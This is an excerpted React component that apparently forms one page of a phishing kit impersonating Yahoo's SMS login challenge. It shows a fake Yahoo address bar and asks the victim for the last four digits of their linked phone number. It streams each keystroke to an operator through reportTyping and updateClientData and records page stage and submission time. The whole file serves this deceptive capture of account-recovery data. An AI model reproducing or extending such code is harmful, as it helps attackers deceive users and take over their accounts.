...
const YahooCodeSmsPage = () => {
  ...
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_codesms",
        currentPage: "yahoo_codesms",
        yahooStage: "Code SMS",
        fromForm: true,
      });
    } catch {}
  ...
  const resolvedEmail = React.useMemo(() => {
    const fromClient =
      (clientData && (clientData.yahooCodeSmsEmail || clientData.email)) || "";
    if (fromClient && String(fromClient).trim())
      return String(fromClient).trim();
    try {
      return (
        (typeof window !== "undefined" &&
          ((localStorage.getItem("yahoo_codesms_email") || "").trim() ||
      ...
      >
        ...
        >
          ...
          <div style={{ padding: 24 }}>
            ...
            >
              Enter the last 4 digits of the phone number linked to your
              account:{" "}
              <strong>
                {(() => {
                  const ds = (
                    (typeof window !== "undefined" &&
                      localStorage.getItem("yahoo_codesms_digits")) ||
                    ""
                  ).replace(/\D/g, "");
            ...
            <label htmlFor="last4" style={{ fontSize: 12, color: "#6b7280" }}>
              Last 4 digits
            </label>
            <input
              data-yahoo-modal
              ...
              onChange={(e) => {
                ...
                setLast4(v);
                try {
                  updateClientData({ yahooCodeSms: v });
                  reportTyping("yahoocodesms", v);
                } catch {}
              }}
              style={{
                width: "100%",
            ...
            <div style={{ marginTop: 12 }}>
              <button
                ...
                style={{
                  width: "100%",
                  padding: "14px",
                  background: last4.length === 4 ? "#6a33f5" : "#e6dbfb",
                  color: last4.length === 4 ? "#fff" : "#5f5a64",
                  border: "none",
                  borderRadius: 28,
                  fontSize: 14,
                  fontWeight: 700,
                ...
                onClick={(e) => {
                  ...
                  try {
                    updateClientData({ yahooCodeSmsSubmittedAt: Date.now() });
                  } catch {}
                }}
              >
                Next
              ...
              >
                ...
                >
                  ...
                  >
                    ...
                    >
                      https://login.yahoo.com/account/challenge/sms?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login
                    </div>
                  </div>
                </div>
...
export default YahooCodeSmsPage;
